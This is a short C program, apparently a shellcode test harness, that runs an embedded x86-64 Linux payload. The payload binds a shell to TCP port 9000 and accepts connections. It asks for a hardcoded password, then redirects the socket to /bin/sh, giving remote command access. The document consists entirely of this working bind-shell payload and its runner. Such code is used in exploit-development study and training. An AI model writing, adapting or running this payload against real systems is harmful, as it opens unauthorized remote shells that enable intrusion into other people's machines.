#include <stdio.h>
#include <string.h>

unsigned char code[] = \
"\x48\x31\xc0\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x66\x6a\x29\x66\x58\x48\xff\xc7\x48\xff\xc7\x48\xff\xc6\x52\x0f\x05\x48\x89\xc3\x66\x6a\x31\x66\x58\x48\x89\xdf\x52\x52\x66\x68\x23\x28\x66\x6a\x02\x48\x89\xe6\xb2\x1e\x0f\x05\x66\x6a\x32\x66\x58\x48\x89\xdf\x48\x31\xf6\x0f\x05\x66\x6a\x2b\x66\x58\x48\x89\xdf\x48\x31\xf6\x48\x31\xd2\x0f\x05\x48\x89\xc5\x48\xff\xc6\x48\xff\xc6\x48\xff\xc6\x66\x6a\x21\x66\x58\x48\x89\xef\x48\xff\xce\x0f\x05\x75\xf1\xeb\x4d\x48\x31\xc0\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x57\x5d\x55\xfe\xc0\x48\xff\xc7\x66\x83\xc6\x20\x56\x48\x31\xf6\x48\xbe\x65\x6e\x74\x69\x61\x6c\x73\x2e\x56\x48\x31\xf6\x48\x81\xc6\x63\x72\x65\x64\x56\x48\x31\xf6\x66\x81\xc6\x74\x20\x56\x48\xbe\x49\x6e\x63\x6f\x72\x72\x65\x63\x56\x48\x89\xe6\xb2\x22\x0f\x05\x48\x31\xc0\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x57\x5d\x55\xfe\xc0\x48\xff\xc7\x48\xbe\x61\x73\x73\x77\x6f\x72\x64\x3a\x56\x48\xbe\x65\x20\x79\x6f\x75\x72\x20\x70\x56\x48\xbe\x49\x6e\x74\x72\x6f\x64\x75\x63\x56\x48\x89\xe6\xb2\x1c\x0f\x05\x48\x31\xc0\x48\x31\xff\x48\x31\xd2\x52\x5d\x55\x48\x89\xe6\xb2\x1e\x0f\x05\x48\x89\xe7\x48\x31\xc0\x48\x31\xf6\x48\x31\xd2\x48\xbe\x52\x70\x4b\x56\x45\x46\x62\x41\x56\x48\xbe\x57\x6a\x62\x6b\x4e\x33\x79\x51\x56\x48\x89\xe6\x48\x31\xc9\xb1\x10\xf3\xa6\x0f\x85\x32\xff\xff\xff\x48\x31\xc0\x50\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x48\x89\xe7\x50\x48\x89\xe2\x57\x48\x89\xe6\x66\x6a\x3b\x66\x58\x0f\x05"

;

main()
{

  printf("Shellcode Length:  %d\n", strlen(code));

        int (*ret)() = (int(*)())code;

        ret();

}